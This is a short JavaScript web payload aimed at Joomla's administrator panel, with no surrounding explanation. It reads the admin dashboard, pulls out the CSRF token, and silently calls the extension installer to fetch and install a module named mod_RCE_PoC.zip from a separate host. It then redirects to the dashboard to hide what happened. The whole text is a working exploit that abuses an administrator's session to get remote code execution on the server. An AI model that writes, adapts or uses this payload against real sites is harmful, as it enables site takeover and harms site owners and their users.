const exploitURL = "http://192.168.5.15/mod_RCE_PoC.zip";
const joomlaRoot = "";
const installModuleURL = joomlaRoot + "/administrator/index.php?option=com_installer&view=install";
const dashboardURL = joomlaRoot + "/administrator/index.php";
const req = new XMLHttpRequest();
req.open("GET", dashboardURL, false);
req.send(null);
const csrfToken = req.responseText.match(/"csrf.token":"([^"]*?)"/)[1];
const bodyData = "install_directory=/var/www/html/joomla/tmp&install_url=" + exploitURL + "&installtype=url&task=install.install&" + csrfToken + "=1";
req.open("POST", installModuleURL, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(bodyData);
req.onreadystatechange = function() {
  if (req.readyState == XMLHttpRequest.DONE) {
    window.location.replace(dashboardURL);
  }
}
